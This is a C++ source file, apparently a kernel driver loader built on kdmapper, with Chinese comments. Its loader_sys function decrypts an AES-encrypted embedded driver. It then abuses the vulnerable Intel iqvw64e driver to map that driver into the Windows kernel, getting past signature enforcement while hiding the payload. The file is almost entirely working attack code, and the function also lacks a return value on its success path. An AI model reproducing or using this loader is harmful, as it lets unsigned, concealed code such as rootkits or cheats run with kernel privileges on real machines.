#include "kdmapper.hpp"
#include "loader.h"
#include "aes.h"
#include "MyDriver.h"
HANDLE iqvw64e_device_handle;
bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr) {
	UNREFERENCED_PARAMETER(param1);
	UNREFERENCED_PARAMETER(param2);
	UNREFERENCED_PARAMETER(allocationPtr);
	UNREFERENCED_PARAMETER(allocationSize);
	UNREFERENCED_PARAMETER(mdlptr);
	Log("[+] Callback example called" << std::endl);
	
	/*
	This callback occurs before call driver entry and
	can be usefull to pass more customized params in 
	the last step of the mapping procedure since you 
	know now the mapping address and other things
	*/
	return true;
}
/// <summary>
/// 加载驱动
/// </summary>
/// <param name="free">加载执行完成后是否释放</param>
/// <param name="allocType">分配内存方式 1 mdl  2 AllocateIndependentPages</param>
/// <returns></returns>
int  loader_sys(bool free, unsigned char allocType) {

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CTR_xcrypt_buffer(&ctx, (uint8_t*)fileData, FILE_LEN);

	kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;
	if (allocType==1)
	{
		mode = kdmapper::AllocationMode::AllocateMdl;
	}
	else if (allocType == 2)
	{
		mode = kdmapper::AllocationMode::AllocateIndependentPages;
	}
	else
	{
		Log(L"[-] Unknow allocation modes" << std::endl);
		return -1;
	} 
	iqvw64e_device_handle = intel_driver::Load();
	if (iqvw64e_device_handle == INVALID_HANDLE_VALUE)
		return -1;
	NTSTATUS exitCode = 0;
	if (!kdmapper::MapDriver(iqvw64e_device_handle, fileData, intel_driver::ntoskrnlAddr, 0, free, true, mode, false, callbackExample, &exitCode)) {
		Log(L"[-] Failed to map " << driver_path << std::endl);
		intel_driver::Unload(iqvw64e_device_handle);
		return -1;
	}

	if (!intel_driver::Unload(iqvw64e_device_handle)) {
		Log(L"[-] Warning failed to fully unload vulnerable driver " << std::endl);
	}
	Log(L"[+] success" << std::endl);
}